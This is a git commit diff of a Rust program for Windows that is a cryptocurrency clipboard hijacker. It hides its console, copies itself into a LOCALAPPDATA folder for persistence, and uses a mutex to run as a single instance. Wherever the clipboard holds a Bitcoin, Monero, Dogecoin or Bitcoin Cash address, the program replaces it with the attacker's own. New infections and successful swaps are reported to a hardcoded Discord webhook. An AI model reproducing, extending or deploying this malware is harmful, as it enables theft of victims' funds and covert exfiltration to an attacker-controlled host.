fa4999f84dcdc2a58271d1a94c870d4d4ef4f748
Atsukoro1 <dornicakkuba@gmail.com>
2023-05-02 22:01:31 +0200

    feat: 🎸 Mutex persistence

--- src/main.rs
+++ src/main.rs
@@ -1,34 +1,25 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
 use regex::Regex;
+use winapi::um::{synchapi::{OpenMutexW, CreateMutexW}, winnt::SYNCHRONIZE};
 use std::{
     collections::HashMap,
     env,
-    ffi::OsStr,
     fs::{copy, create_dir_all},
     io,
-    os::windows::prelude::OsStrExt,
-    path::{PathBuf, Path},
-    ptr::null_mut,
+    ops::Deref,
+    path::PathBuf,
     str::FromStr,
     thread,
-    time::Duration, ops::Deref,
-};
-use winapi::um::winnt::HANDLE;
-use winapi::{
-    um::{
-        synchapi::{CreateMutexW, OpenMutexW},
-        winnt::SYNCHRONIZE,
-    },
+    time::Duration, ffi::OsStr, os::windows::{prelude::OsStrExt, raw::HANDLE}, ptr::null_mut,
 };
 use winreg::{enums::*, RegKey};
 
-// Make those values unique
 static WEBHOOK: &str = "https://discord.com/api/webhooks/1103006398784212992/50iC4B_EO-wOFggTNnSXi4AXzawaObUmK9LzoNfalQbB6_Xw0T0kRTX2hdeXZLzaDRDf";
-static MUTEX: &str = "Fjv8fWJtM9c2qsK5";
-static FILE_NAME: &str = "jk4dflk4b4jb343jbloijoibfvcs";
-static FOLDER_NAME: &str = "CachedTools";
+static FILE_NAME: &str = "cryptex.exe";
+static MUTEX: &str = "kf3klj43n3cnh";
+static FOLDER_NAME: &str = "sdsdfsdsfd";
 
 const BTC_ADDR: &str = "h";
 const XMR_ADDR: &str = "dfssdf";
@@ -49,7 +40,6 @@ fn file_exists(file_path: &PathBuf) -> bool {
     file_path.exists() && file_path.is_file()
 }
 
-
 fn get_destination_path() -> (PathBuf, PathBuf) {
     let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(FOLDER_NAME);
 
@@ -69,7 +59,7 @@ async fn persistence() -> io::Result<()> {
             if !file_exists(&file_path) {
                 create_dir_all(&folder_path)?;
                 copy(current_path, file_path)?;
-            } else {
+
                 send_webhook("New client detected".to_string()).await;
             }
         }
@@ -86,7 +76,12 @@ fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
 
     let mut check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
         if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
-            if let Ok(..) = cb_prov.set_contents(String::from(set)) {
+            if let Ok(..) = cb_prov.set_contents(
+                Regex::from_str(check)
+                    .unwrap()
+                    .replace(&clipoard_text, set)
+                    .to_string(),
+            ) {
                 return Some(true);
             }
         }
@@ -98,8 +93,8 @@ fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
         for (regex_str, address) in check_map {
             if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
                 return Some((
-                    String::from(regex_str.deref()), 
-                    String::from(address.deref())
+                    String::from(regex_str.deref()),
+                    String::from(address.deref()),
                 ));
             }
         }
@@ -127,22 +122,10 @@ fn check_mutex() -> bool {
         .chain(Some(0).into_iter())
         .collect();
 
-    let handle: HANDLE = unsafe { 
-        OpenMutexW(
-            SYNCHRONIZE, 
-            0, 
-            mutex_name.as_ptr()
-        ) 
-    };
+    let handle: HANDLE = unsafe { OpenMutexW(SYNCHRONIZE, 0, mutex_name.as_ptr()) };
 
     if handle.is_null() {
-        let new_handle: HANDLE = unsafe { 
-            CreateMutexW(
-                null_mut(), 
-                0, 
-                mutex_name.as_ptr()
-            ) 
-        };
+        let new_handle: HANDLE = unsafe { CreateMutexW(null_mut(), 0, mutex_name.as_ptr()) };
 
         if new_handle.is_null() {
             return false;
@@ -168,16 +151,16 @@ async fn main() {
             (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
             (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
         ]);
-
+    
         match persistence().await {
             Ok(..) => loop {
                 let scan_res = scan(&map);
-
+    
                 if scan_res.is_some() {
                     send_webhook("Copied to clipboard".to_string()).await;
                 }
-
-                thread::sleep(Duration::from_millis(100));
+    
+                thread::sleep(Duration::from_millis(500));
             },
             Err(..) => {}
         };
